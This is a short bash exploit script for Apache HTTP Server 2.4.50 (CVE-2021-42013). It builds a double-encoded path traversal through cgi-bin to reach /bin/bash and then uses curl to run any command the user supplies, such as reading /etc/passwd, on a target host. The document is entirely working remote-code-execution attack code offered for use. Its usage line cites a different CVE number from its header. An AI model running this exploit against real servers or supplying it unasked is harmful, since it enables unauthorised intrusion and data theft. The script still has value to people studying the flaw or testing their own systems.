#!/bin/bash

# Exploit Title: Apache HTTP Server 2.4.50 - Path traversal and file disclosure vulnerability
# Date: 12.03.22
# Exploit Author: the29a (0x29a.in)
# Vendor Homepage: https://apache.org/
# Version: 2.4.50
# Tested on: 2.4.50
# CVE: CVE-2021-42013


PATH="/bin/bash"    # Path to shell, i.e /bin/bash
TARGET="$1"         # Set host, i.e 172.18.0.2
COMMAND="$2"        # i.e "whoami && pwd && id" or "cat /etc/passwd"
PAYLOAD="cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/"

if [ -z "$TARGET" ] || [ -z "$COMMAND" ]; then
    echo "Error: use two arguments."
    echo "Usage example: ./CVE-2021-41773.sh <TARGET> <COMMAND>"
    exit 1
fi

# Check host availability
status_code="$(/usr/bin/curl  -o /dev/null -s -w "%{http_code}" "$TARGET")"
if [[ "$status_code" -ge 200 && "$status_code" -lt 400 ]]; then
    printf "Host is up.\n\n"
else
    echo "Host is down or inaccessible (HTTP code: $status_code)."
    exit 1
fi

# Exploit function
exploit(){
    echo "Running."
    /usr/bin/curl "$TARGET/$PAYLOAD$PATH" \
    -d "echo Content-Type: text/plain; echo; $COMMAND" \
    -H "Content-Type: text/plain"
    }
exploit
